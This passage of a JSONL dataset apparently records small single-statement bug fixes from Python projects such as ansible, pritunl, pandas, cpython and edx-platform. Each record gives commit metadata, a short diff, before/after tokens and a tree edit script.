{"project": "ansible-1", "commit_sha": "e33c24f585e0441ed30a7eaa0a0811181ef6fadc", "parent_sha": "ea2afc6ebc1f1ce48faff9f004110e4b79886d5b", "file_path": "lib/ansible/module_utils/eos.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -176,7 +176,7 @@ class Cli:\n         rc = 0\n         for command in to_list(commands):\n             if command == 'end':\n-                pass\n+                continue\n \n             if command.startswith('banner') or multiline:\n                 multiline = True\n", "before": "pass", "after": "continue", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"block\", 3, 17, 3, 21], [\"continue_statement\", \"N0\"], 0], [\"Insert\", \"N0\", [\"continue:continue\", \"T\"], 0], [\"Delete\", [\"pass:pass\", 3, 17, 3, 21]], [\"Delete\", [\"pass_statement\", 3, 17, 3, 21]]]"}
{"project": "ansible-1", "commit_sha": "0b0348d81c8c404dbd6244ce9cf3c51f0e0c4bb8", "parent_sha": "4832b9a2d252601921d075bc33d7164f231924d7", "file_path": "lib/ansible/modules/monitoring/sensu_silence.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -264,7 +264,7 @@ def main():\n             check=dict(required=False),\n             creator=dict(required=False),\n             expire=dict(required=False),\n-            expire_on_resolve=dict(type=bool, required=False),\n+            expire_on_resolve=dict(type='bool', required=False),\n             reason=dict(required=False),\n             state=dict(default='present', choices=['present', 'absent']),\n             subscription=dict(required=True),\n", "before": "expire_on_resolve = dict ( type = bool , required = False ) ,", "after": "expire_on_resolve = dict ( type = 'bool' , required = False ) ,", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 36, 3, 45], [\"string:'bool'\", \"T\"], 2], [\"Delete\", [\"identifier:bool\", 3, 41, 3, 45]]]"}
{"project": "pritunl", "commit_sha": "8a58371d7293c4fd18581136f9371a8e18381aa1", "parent_sha": "746e3d47e8863e79745e5d49f22f665e1a8e1ced", "file_path": "pritunl/handlers/user.py", "project_url": "https://github.com/security-geeks/pritunl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -34,7 +34,7 @@ def user_get(org_id, user_id=None, page=None):\n     if user_id:\n         return utils.jsonify(org.get_user(user_id).dict())\n \n-    page = flask.request.args.get('page', None)\n+    page = flask.request.args.get('page', page)\n     page = int(page) if page else page\n     search = flask.request.args.get('search', None)\n     limit = int(flask.request.args.get('limit', settings.user.page_count))\n", "before": "page = flask . request . args . get ( 'page' , None )", "after": "page = flask . request . args . get ( 'page' , page )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 34, 3, 48], [\"identifier:page\", \"T\"], 3], [\"Delete\", [\"none:None\", 3, 43, 3, 47]]]"}
{"project": "pritunl", "commit_sha": "c83a8362f75748c4d7b716cf130bc5eb95f43b7a", "parent_sha": "2b3d286805015a93515af537e7b2b3be9edc5365", "file_path": "pritunl/tasks/route.py", "project_url": "https://github.com/security-geeks/pritunl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -50,7 +50,7 @@ class TaskRoute(task.Task):\n                     if vpc_region == route_vpc_region or \\\n                             route_vpc_id == route_vpc_id or \\\n                             route_network == route_network:\n-                        match = true\n+                        match = True\n \n                 if not match:\n                     self.routes_collection.remove({\n", "before": "match = true", "after": "match = True", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"assignment\", 3, 25, 3, 37], [\"true:True\", \"T\"], 2], [\"Delete\", [\"identifier:true\", 3, 33, 3, 37]]]"}
{"project": "moto", "commit_sha": "2e5e7e7f5ea7347da632eb7dcab3c588fec25a9e", "parent_sha": "a1d095c14b206ed74bf205140a4961a81c1ae666", "file_path": "tests/test_ec2/test_internet_gateways.py", "project_url": "https://github.com/kidomine/moto", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -199,7 +199,7 @@ def test_igw_desribe():\n \n \n @mock_ec2_deprecated\n-def test_igw_desribe_bad_id():\n+def test_igw_describe_bad_id():\n     \"\"\" internet gateway fail to fetch by bad id \"\"\"\n     conn = boto.connect_vpc('the_key', 'the_secret')\n     with assert_raises(EC2ResponseError) as cm:\n", "before": "def test_igw_desribe_bad_id ( ) : \"\"\" internet gateway fail to fetch by bad id \"\"\" conn = boto . connect_vpc ( 'the_key' , 'the_secret' ) with assert_raises ( EC2ResponseError ) as cm : ", "after": "def test_igw_describe_bad_id ( ) : \"\"\" internet gateway fail to fetch by bad id \"\"\" conn = boto . connect_vpc ( 'the_key' , 'the_secret' ) with assert_raises ( EC2ResponseError ) as cm : ", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:test_igw_desribe_bad_id\", 3, 5, 3, 28], \"test_igw_describe_bad_id\"]]"}
{"project": "pritunl", "commit_sha": "eddb691afa8e8f0c8c7fad7650f28d463d5aa78c", "parent_sha": "4f203b42599b05afa25af2ac564dff5240ed17a1", "file_path": "pritunl/handlers/key.py", "project_url": "https://github.com/security-geeks/pritunl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -363,7 +363,7 @@ def user_linked_key_page_get(short_code):\n \n @app.app.route('/k/<short_code>', methods=['DELETE'])\n @auth.open_auth\n-def user_linked_key_page_delete_get(short_code):\n+def user_linked_key_page_delete(short_code):\n     utils.rand_sleep()\n \n     collection = mongo.get_collection('users_key_link')\n", "before": "def user_linked_key_page_delete_get ( short_code ) : utils . rand_sleep ( ) collection = mongo . get_collection ( 'users_key_link' )", "after": "def user_linked_key_page_delete ( short_code ) : utils . rand_sleep ( ) collection = mongo . get_collection ( 'users_key_link' )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:user_linked_key_page_delete_get\", 3, 5, 3, 36], \"user_linked_key_page_delete\"]]"}
{"project": "mopidy", "commit_sha": "2463fdd945141e0e44415647e5067862ccb2c730", "parent_sha": "91853eca2ca759e28adba261650b3d5834b09234", "file_path": "tests/frontends/mpd/playback_test.py", "project_url": "https://github.com/atxwebs/mopidy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -271,7 +271,7 @@ class PlaybackControlHandlerTest(unittest.TestCase):\n         self.assertEqual(self.b.playback.PLAYING, self.b.playback.state)\n         self.assertEqual(self.b.playback.current_track.uri, 'a')\n \n-    def test_play_minus_one_plays_current_track_if_current_track_is_set(self):\n+    def test_playid_minus_one_plays_current_track_if_current_track_is_set(self):\n         self.b.current_playlist.append([Track(uri='a'), Track(uri='b')])\n         self.assertEqual(self.b.playback.current_track, None)\n         self.b.playback.play()\n", "before": "def test_play_minus_one_plays_current_track_if_current_track_is_set ( self ) : self . b . current_playlist . append ( [ Track ( uri = 'a' ) , Track ( uri = 'b' ) ] ) self . assertEqual ( self . b . playback . current_track , None ) self . b . playback . play ( )", "after": "def test_playid_minus_one_plays_current_track_if_current_track_is_set ( self ) : self . b . current_playlist . append ( [ Track ( uri = 'a' ) , Track ( uri = 'b' ) ] ) self . assertEqual ( self . b . playback . current_track , None ) self . b . playback . play ( )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:test_play_minus_one_plays_current_track_if_current_track_is_set\", 3, 9, 3, 72], \"test_playid_minus_one_plays_current_track_if_current_track_is_set\"]]"}
{"project": "mopidy", "commit_sha": "98587f50986fa32a87994fa366904369608dd9ff", "parent_sha": "2c31dbe47c1f24b9ed061a7a2f2c7beb21b3dc6a", "file_path": "tests/utils/test_validation.py", "project_url": "https://github.com/atxwebs/mopidy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -11,7 +11,7 @@ def test_check_boolean_with_valid_values():\n         validation.check_boolean(value)\n \n \n-def test_check_boolean_with_truthy_values():\n+def test_check_boolean_with_other_values():\n     for value in 1, 0, None, '', list(), tuple():\n         with raises(exceptions.ValidationError):\n             validation.check_boolean(value)\n", "before": "def test_check_boolean_with_truthy_values ( ) : for value in 1 , 0 , None , '' , list ( ) , tuple ( ) : with raises ( exceptions . ValidationError ) : validation . check_boolean ( value )", "after": "def test_check_boolean_with_other_values ( ) : for value in 1 , 0 , None , '' , list ( ) , tuple ( ) : with raises ( exceptions . ValidationError ) : validation . check_boolean ( value )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:test_check_boolean_with_truthy_values\", 3, 5, 3, 42], \"test_check_boolean_with_other_values\"]]"}
{"project": "pandas", "commit_sha": "4d6d6b9f45dc9a793827be53114f724b4c4873fd", "parent_sha": "f7aeaeb3bd7e4c2fd072e5b9c38f06929f0ead77", "file_path": "pandas/core/frame.py", "project_url": "https://github.com/jmwoloso/pandas", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -3954,7 +3954,7 @@ class DataFrame(NDFrame):\n             else:\n                 result = notnull(frame).sum(axis=axis)\n \n-        return result\n+        return result.astype('int64')\n \n     def _count_level(self, level, axis=0, numeric_only=False):\n         if numeric_only:\n", "before": "return result", "after": "return result . astype ( 'int64' )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"return_statement\", 3, 9, 3, 22], [\"call\", \"N0\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:result\", 3, 16, 3, 22], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:astype\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:'int64'\", \"T\"], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2]]"}
{"project": "dit", "commit_sha": "2ba210e3c41d012332e788a8bc81f9885fd8cf35", "parent_sha": "24c57f05e69f94e5fc8ef0225d9fd83bd61f7b4d", "file_path": "dit/utils/bindargs.py", "project_url": "https://github.com/mpeaton37/dit", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -188,7 +188,7 @@ def bindcallargs_leq32(_fUnCtIoN_, *args, **kwargs):\n     bkwargs = dict((kwonlyarg, callargs[kwonlyarg]) for kwonlyarg in spec.kwonlyargs)\n     # Add in kwonlydefaults for unspecified kwonlyargs only.\n     if spec.kwonlydefaults is not None:\n-        bkwargs.update(dict([(k, v) for k in spec.kwonlydefaults\n+        bkwargs.update(dict([(k, v) for k in spec.kwonlydefaults.items()\n                              if k not in bkwargs]))\n     # Add in varkw.\n     if spec.varkw is not None:\n", "before": "bkwargs . update ( dict ( [ ( k , v ) for k in spec . kwonlydefaults if k not in bkwargs ] ) )", "after": "bkwargs . update ( dict ( [ ( k , v ) for k in spec . kwonlydefaults . items ( ) if k not in bkwargs ] ) )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"for_in_clause\", 3, 37, 3, 65], [\"call\", \"N0\"], 3], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"attribute\", 3, 46, 3, 65], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:items\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"):)\", \"T\"], 1]]"}
{"project": "cpython", "commit_sha": "0963191d8c894f911ea023e6561dad9e1eb201d0", "parent_sha": "05bf3e83d42368c289d8877e2ffe400954870d75", "file_path": "Lib/traceback.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -189,7 +189,7 @@ def format_exception_only(etype, value):\n         if badline is not None:\n             lines.append('    %s\\n' % badline.strip())\n             if offset is not None:\n-                caretspace = badline[:offset].lstrip()\n+                caretspace = badline.rstrip('\\n')[:offset].lstrip()\n                 # non-space whitespace (likes tabs) must be kept for alignment\n                 caretspace = ((c.isspace() and c or ' ') for c in caretspace)\n                 # only three spaces to account for offset1 == pos 0\n", "before": "caretspace = badline [ : offset ] . lstrip ( )", "after": "caretspace = badline . rstrip ( '\\n' ) [ : offset ] . lstrip ( )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"subscript\", 3, 30, 3, 46], [\"call\", \"N0\"], 0], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:badline\", 3, 30, 3, 37], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:rstrip\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:'\\\\n'\", \"T\"], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2]]"}
{"project": "cpython", "commit_sha": "d2a87c9b291d8570d76bc21c4e5e5a97dfc6f40c", "parent_sha": "41e5565fefb0c8c511956642604268fe77d54c62", "file_path": "Demo/md5test/md5driver.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -80,7 +80,7 @@ def MDFilter():\n     mdContext = md5()\n \n     while 1:\n-        data = sys.stdin.read(16)\n+        data = sys.stdin.read(16).encode()\n         if not data:\n             break\n         mdContext.update(data)\n", "before": "data = sys . stdin . read ( 16 )", "after": "data = sys . stdin . read ( 16 ) . encode ( )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 16, 3, 34], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 16, 3, 34], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 16, 3, 34], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:encode\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"):)\", \"T\"], 1]]"}
{"project": "cpython", "commit_sha": "48965c32863c328734219c371a0cf09655e37dfb", "parent_sha": "8c02c7117f055f179aa8407364ba366d0fb4c2b8", "file_path": "Lib/test/test_pkgimport.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -29,7 +29,7 @@ class TestImport(unittest.TestCase):\n         self.package_dir = os.path.join(self.test_dir,\n                                         self.package_name)\n         os.mkdir(self.package_dir)\n-        open(os.path.join(self.package_dir, '__init__.py'), 'w')\n+        open(os.path.join(self.package_dir, '__init__.py'), 'w').close()\n         self.module_path = os.path.join(self.package_dir, 'foo.py')\n \n     def tearDown(self):\n", "before": "open ( os . path . join ( self . package_dir , '__init__.py' ) , 'w' )", "after": "open ( os . path . join ( self . package_dir , '__init__.py' ) , 'w' ) . close ( )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 9, 3, 65], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 9, 3, 65], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 9, 3, 65], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:close\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"):)\", \"T\"], 1]]"}
{"project": "cpython", "commit_sha": "de9d51d9446ce99ba0a7479b6d76920265e54b10", "parent_sha": "b8e4668cf838615a9b70e98012e6039955133ae0", "file_path": "Lib/test/test_pkgimport.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -22,7 +22,7 @@ class TestImport(unittest.TestCase):\n         self.package_dir = os.path.join(self.test_dir,\n                                         self.package_name)\n         os.mkdir(self.package_dir)\n-        open(os.path.join(self.package_dir, '__init__.py'), 'w')\n+        open(os.path.join(self.package_dir, '__init__.py'), 'w').close()\n         self.module_path = os.path.join(self.package_dir, 'foo.py')\n \n     def tearDown(self):\n", "before": "open ( os . path . join ( self . package_dir , '__init__.py' ) , 'w' )", "after": "open ( os . path . join ( self . package_dir , '__init__.py' ) , 'w' ) . close ( )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 9, 3, 65], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 9, 3, 65], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 9, 3, 65], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:close\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"):)\", \"T\"], 1]]"}
{"project": "pybing", "commit_sha": "67687d4b90c0d5708bf9a1c6d2267051735432df", "parent_sha": "b4a9346b692c4bb2cbb120a4cd7ade1a4309aae6", "file_path": "pybing/bing.py", "project_url": "https://github.com/raman-sharma/pybing", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -40,7 +40,7 @@ class Bing(object):\n         \n         query_string = urllib.urlencode(kwargs)\n         contents = urllib2.urlopen(constants.JSON_ENDPOINT + '?' + query_string)\n-        return json.loads(contents)\n+        return json.loads(contents.read())\n     \n     def search_web(self, query):\n         return self.search(query, source_type=constants.WEB_SOURCE_TYPE)\n", "before": "return json . loads ( contents )", "after": "return json . loads ( contents . read ( ) )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 26, 3, 36], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 26, 3, 36], [\"):)\", \"T\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:contents\", 3, 27, 3, 35], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:read\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Move\", \"N2\", [\"):)\", 3, 35, 3, 36], 1]]"}
{"project": "bcc", "commit_sha": "3d981513c6347e939db8a05722d02ea3b90dec9f", "parent_sha": "738a617a7027441ca04455cb674cb969980e592d", "file_path": "src/python/bcc/usdt.py", "project_url": "https://github.com/jcanseco/bcc", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -128,7 +128,7 @@ class USDT(object):\n                             probe)\n \n     def get_text(self):\n-        return lib.bcc_usdt_genargs(self.context)\n+        return lib.bcc_usdt_genargs(self.context).decode()\n \n     def get_probe_arg_ctype(self, probe_name, arg_index):\n         return lib.bcc_usdt_get_probe_argctype(\n", "before": "return lib . bcc_usdt_genargs ( self . context )", "after": "return lib . bcc_usdt_genargs ( self . context ) . decode ( )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 16, 3, 50], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 16, 3, 50], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 16, 3, 50], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:decode\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"):)\", \"T\"], 1]]"}
{"project": "bcc", "commit_sha": "1a1f441fe978ac2837e30a5d0206e35f6aa14d05", "parent_sha": "8ef6eb8da1c065d70554071ae4943c0c6f90a3de", "file_path": "src/python/bcc/usdt.py", "project_url": "https://github.com/jcanseco/bcc", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -130,7 +130,7 @@ class USDT(object):\n                 raise USDTException(\"USDT failed to instrument PID %d\" % pid)\n         elif path:\n             self.path = path\n-            self.context = lib.bcc_usdt_new_frompath(path)\n+            self.context = lib.bcc_usdt_new_frompath(path.encode('ascii'))\n             if self.context == None:\n                 raise USDTException(\"USDT failed to instrument path %s\" % path)\n         else:\n", "before": "self . context = lib . bcc_usdt_new_frompath ( path )", "after": "self . context = lib . bcc_usdt_new_frompath ( path . encode ( 'ascii' ) )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 53, 3, 59], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 53, 3, 59], [\"):)\", \"T\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:path\", 3, 54, 3, 58], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:encode\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:'ascii'\", \"T\"], 1], [\"Move\", \"N2\", [\"):)\", 3, 58, 3, 59], 2]]"}
{"project": "pony", "commit_sha": "cc57a17c180fd88231daf3855f872a225969e091", "parent_sha": "d09e0dd4dea26b777d0807a7722a22c563fb4ae2", "file_path": "pony/orm/core.py", "project_url": "https://github.com/jelmer/pony", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -984,7 +984,7 @@ class Database(object):\n         return result\n     def _get_schema_json(database):\n         schema_json = json.dumps(database._get_schema_dict(), default=basic_converter, sort_keys=True)\n-        schema_hash = md5(schema_json).hexdigest()\n+        schema_hash = md5(schema_json.encode('utf-8')).hexdigest()\n         return schema_json, schema_hash\n     @cut_traceback\n     def to_json(database, data, include=(), exclude=(), converter=None, with_schema=True, schema_hash=None):\n", "before": "schema_hash = md5 ( schema_json ) . hexdigest ( )", "after": "schema_hash = md5 ( schema_json . encode ( 'utf-8' ) ) . hexdigest ( )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 26, 3, 39], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 26, 3, 39], [\"):)\", \"T\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:schema_json\", 3, 27, 3, 38], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:encode\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:'utf-8'\", \"T\"], 1], [\"Move\", \"N2\", [\"):)\", 3, 38, 3, 39], 2]]"}
{"project": "snafu", "commit_sha": "97199fa5c433f19e4ee749e31810d67e1b602dea", "parent_sha": "8b794fb24ca1d23aac3617ede409f0bc0af072a8", "file_path": "snafu/scale_openshift_wrapper/trigger_scale.py", "project_url": "https://github.com/cloud-bulldozer/snafu", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -46,7 +46,7 @@ class Trigger_scale():\n \n         if self.incluster == \"true\":\n             config.load_incluster_config()\n-            k8s_config = client.Configuration()\n+            k8s_config = client.Configuration().get_default_copy()\n             k8s_client = client.api_client.ApiClient(configuration=k8s_config)\n         elif self.kubeconfig:\n             k8s_client = config.new_client_from_config(self.kubeconfig)\n", "before": "k8s_config = client . Configuration ( )", "after": "k8s_config = client . Configuration ( ) . get_default_copy ( )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"attribute\", 3, 26, 3, 46], [\"call\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 26, 3, 46], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 3, 26, 3, 46], [\"identifier:get_default_copy\", \"T\"], 2], [\"Move\", \"N0\", [\"attribute\", 3, 26, 3, 46], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"):)\", \"T\"], 1]]"}
{"project": "edx-platform", "commit_sha": "b69cbfa1005c3abfdbc02c1934d81fe84536bbba", "parent_sha": "69c47e09511c0fda4762dc959a6a3025dc96f272", "file_path": "common/test/acceptance/pages/lms/staff_view.py", "project_url": "https://github.com/keyurr2/edx-platform", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -30,7 +30,7 @@ class StaffPage(CoursewarePage):\n         \"\"\"\n         Set the current view mode, e.g. \"Staff\", \"Student\" or a content group.\n         \"\"\"\n-        self.q(css=self.VIEW_MODE_OPTIONS_CSS).filter(lambda el: el.text == view_mode).first.click()\n+        self.q(css=self.VIEW_MODE_OPTIONS_CSS).filter(lambda el: el.text.strip() == view_mode).first.click()\n         self.wait_for_ajax()\n \n     def set_staff_view_mode_specific_student(self, username_or_email):\n", "before": "self . q ( css = self . VIEW_MODE_OPTIONS_CSS ) . filter ( lambda el : el . text == view_mode ) . first . click ( )", "after": "self . q ( css = self . VIEW_MODE_OPTIONS_CSS ) . filter ( lambda el : el . text . strip ( ) == view_mode ) . first . click ( )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 66, 3, 86], [\"call\", \"N0\"], 0], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"attribute\", 3, 66, 3, 73], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:strip\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"):)\", \"T\"], 1]]"}
{"project": "edx-platform", "commit_sha": "eab057c8128ad1d21e6d47e8446246e8c04a1435", "parent_sha": "372c59e4a43dcb4c285e46d40aace5886133ecea", "file_path": "openedx/core/djangoapps/api_admin/utils.py", "project_url": "https://github.com/keyurr2/edx-platform", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -41,7 +41,7 @@ def get_id_token(user):\n     }\n     secret_key = helpers.get_value('JWT_AUTH', settings.JWT_AUTH)['JWT_SECRET_KEY']\n \n-    return jwt.encode(payload, secret_key)\n+    return jwt.encode(payload, secret_key).decode('utf-8')\n \n \n def course_discovery_api_client(user):\n", "before": "return jwt . encode ( payload , secret_key )", "after": "return jwt . encode ( payload , secret_key ) . decode ( 'utf-8' )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 12, 3, 43], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 12, 3, 43], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 12, 3, 43], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:decode\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"string:'utf-8'\", \"T\"], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "edx-platform", "commit_sha": "d74bb36634b6b666323a32a963e20a4288389912", "parent_sha": "3c2bfc70a33a4c7876f32ab42844d36b5fcee112", "file_path": "lms/djangoapps/teams/views.py", "project_url": "https://github.com/keyurr2/edx-platform", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -300,7 +300,7 @@ class TeamsListView(GenericAPIView):\n         if course_key and not has_team_api_access(request.user, course_key):\n             return Response(status=status.HTTP_403_FORBIDDEN)\n \n-        data = request.DATA\n+        data = request.DATA.copy()\n         data['course_id'] = course_key\n \n         serializer = CourseTeamCreationSerializer(data=data)\n", "before": "data = request . DATA", "after": "data = request . DATA . copy ( )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 28], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"attribute\", 3, 16, 3, 28], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:copy\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"):)\", \"T\"], 1]]"}
{"project": "populo", "commit_sha": "51f3b94f5318254bbf1515e051e1906fac0ac7c9", "parent_sha": "c74b34c1a81b1629dabb6febf60d01db613cbd90", "file_path": "lms/lib/comment_client/user.py", "project_url": "https://github.com/chauhanhardik/populo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -116,7 +116,7 @@ class User(models.Model):\n \n     def _retrieve(self, *args, **kwargs):\n         url = self.url(action='get', params=self.attributes)\n-        retrieve_params = self.default_retrieve_params\n+        retrieve_params = self.default_retrieve_params.copy()\n         retrieve_params.update(kwargs)\n         if self.attributes.get('course_id'):\n             retrieve_params['course_id'] = self.course_id.to_deprecated_string()\n", "before": "retrieve_params = self . default_retrieve_params", "after": "retrieve_params = self . default_retrieve_params . copy ( )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 55], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"attribute\", 3, 27, 3, 55], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:copy\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 